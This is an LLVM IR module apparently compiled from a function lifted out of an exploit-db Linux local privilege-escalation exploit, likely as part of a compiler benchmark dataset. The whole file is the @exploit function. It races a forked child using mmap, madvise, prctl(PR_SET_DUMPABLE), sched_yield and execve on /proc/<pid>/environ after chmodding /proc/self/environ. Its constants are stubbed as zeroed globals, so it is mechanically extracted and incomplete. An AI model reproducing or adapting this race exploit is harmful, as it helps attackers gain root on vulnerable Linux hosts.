; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_2013.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_2013.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32 }

@.str = private unnamed_addr constant [24 x i8] c"\0Atrying to exploit %s\0A\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [19 x i8] c"/proc/self/environ\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@c = common dso_local global i32* null, align 8
@O_RDONLY = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@PR_SET_DUMPABLE = common dso_local global i32 0, align 4
@t = common dso_local global i32* null, align 8
@.str.3 = private unnamed_addr constant [17 x i8] c"/proc/%d/environ\00", align 1
@a = common dso_local global i32 0, align 4
@e = common dso_local global i32 0, align 4
@MADV_WILLNEED = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [8 x i8] c"madvise\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @exploit(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca %struct.stat, align 4
  store i8* %0, i8** %2, align 8
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0), i8* %7)
  %9 = load i32, i32* @stdout, align 4
  %10 = call i32 @fflush(i32 %9)
  %11 = call i32 @chmod(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i32 2541)
  %12 = load i32, i32* @PROT_READ, align 4
  %13 = load i32, i32* @PROT_WRITE, align 4
  %14 = or i32 %12, %13
  %15 = load i32, i32* @MAP_SHARED, align 4
  %16 = load i32, i32* @MAP_ANONYMOUS, align 4
  %17 = or i32 %15, %16
  %18 = call i32* @mmap(i32 0, i32 4096, i32 %14, i32 %17, i32 0, i32 0)
  store i32* %18, i32** @c, align 8
  %19 = load i32*, i32** @c, align 8
  %20 = bitcast i32* %19 to i8*
  %21 = call i32 @memset(i8* %20, i32 0, i32 4096)
  %22 = load i8*, i8** %2, align 8
  %23 = load i32, i32* @O_RDONLY, align 4
  %24 = call i32 @open(i8* %22, i32 %23)
  store i32 %24, i32* %4, align 4
  %25 = load i32, i32* %4, align 4
  %26 = call i32 @fstat(i32 %25, %struct.stat* %6)
  %27 = getelementptr inbounds %struct.stat, %struct.stat* %6, i32 0, i32 0
  %28 = load i32, i32* %27, align 4
  %29 = load i32, i32* @PROT_READ, align 4
  %30 = load i32, i32* @PROT_WRITE, align 4
  %31 = or i32 %29, %30
  %32 = load i32, i32* @MAP_PRIVATE, align 4
  %33 = load i32, i32* %4, align 4
  %34 = call i32* @mmap(i32 0, i32 %28, i32 %31, i32 %32, i32 %33, i32 0)
  %35 = bitcast i32* %34 to i8*
  store i8* %35, i8** %5, align 8
  %36 = load i8*, i8** %5, align 8
  %37 = load i8*, i8** @MAP_FAILED, align 8
  %38 = icmp eq i8* %36, %37
  br i1 %38, label %39, label %41

39:                                               ; preds = %1
  %40 = call i32 @error(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  br label %41

41:                                               ; preds = %39, %1
  %42 = load i32, i32* @PR_SET_DUMPABLE, align 4
  %43 = call i32 @prctl(i32 %42, i32 0, i32 0, i32 0, i32 0)
  %44 = load i32*, i32** @t, align 8
  %45 = call i32 (...) @getpid()
  %46 = call i32 @sprintf(i32* %44, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0), i32 %45)
  %47 = call i32 (...) @sched_yield()
  %48 = load i32, i32* @a, align 4
  %49 = load i32, i32* @e, align 4
  %50 = call i32 @execve(i32* null, i32 %48, i32 %49)
  %51 = load i32, i32* @MADV_WILLNEED, align 4
  %52 = call i32 @madvise(i8* null, i32 0, i32 %51)
  %53 = call i32 (...) @fork()
  store i32 %53, i32* %3, align 4
  %54 = load i32, i32* %3, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %76

56:                                               ; preds = %41
  %57 = load i32*, i32** @c, align 8
  %58 = load i32, i32* %57, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %57, align 4
  %60 = load i8*, i8** %5, align 8
  %61 = getelementptr inbounds %struct.stat, %struct.stat* %6, i32 0, i32 0
  %62 = load i32, i32* %61, align 4
  %63 = load i32, i32* @MADV_WILLNEED, align 4
  %64 = call i32 @madvise(i8* %60, i32 %62, i32 %63)
  %65 = icmp ne i32 %64, 0
  %66 = xor i1 %65, true
  %67 = zext i1 %66 to i32
  br i1 %66, label %68, label %69

68:                                               ; preds = %56
  br label %71

69:                                               ; preds = %56
  %70 = call i32 @error(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  br label %71

71:                                               ; preds = %69, %68
  %72 = phi i32 [ %67, %68 ], [ %70, %69 ]
  %73 = load i32, i32* @PR_SET_DUMPABLE, align 4
  %74 = call i32 @prctl(i32 %73, i32 1, i32 0, i32 0, i32 0)
  %75 = call i32 (...) @sched_yield()
  br label %91

76:                                               ; preds = %41
  %77 = call i32 @nice(i32 10)
  br label %78

78:                                               ; preds = %83, %76
  %79 = load i32*, i32** @c, align 8
  %80 = load i32, i32* %79, align 4
  %81 = icmp ne i32 %80, 0
  %82 = xor i1 %81, true
  br i1 %82, label %83, label %84

83:                                               ; preds = %78
  br label %78

84:                                               ; preds = %78
  %85 = call i32 (...) @sched_yield()
  %86 = load i32*, i32** @t, align 8
  %87 = load i32, i32* @a, align 4
  %88 = load i32, i32* @e, align 4
  %89 = call i32 @execve(i32* %86, i32 %87, i32 %88)
  %90 = call i32 @error(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  br label %91

91:                                               ; preds = %84, %71
  %92 = load i32, i32* %3, align 4
  %93 = call i32 @waitpid(i32 %92, i32* null, i32 0)
  %94 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @chmod(i8*, i32) #1

declare dso_local i32* @mmap(i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @fstat(i32, %struct.stat*) #1

declare dso_local i32 @error(i8*) #1

declare dso_local i32 @prctl(i32, i32, i32, i32, i32) #1

declare dso_local i32 @sprintf(i32*, i8*, i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @sched_yield(...) #1

declare dso_local i32 @execve(i32*, i32, i32) #1

declare dso_local i32 @madvise(i8*, i32, i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @nice(i32) #1

declare dso_local i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
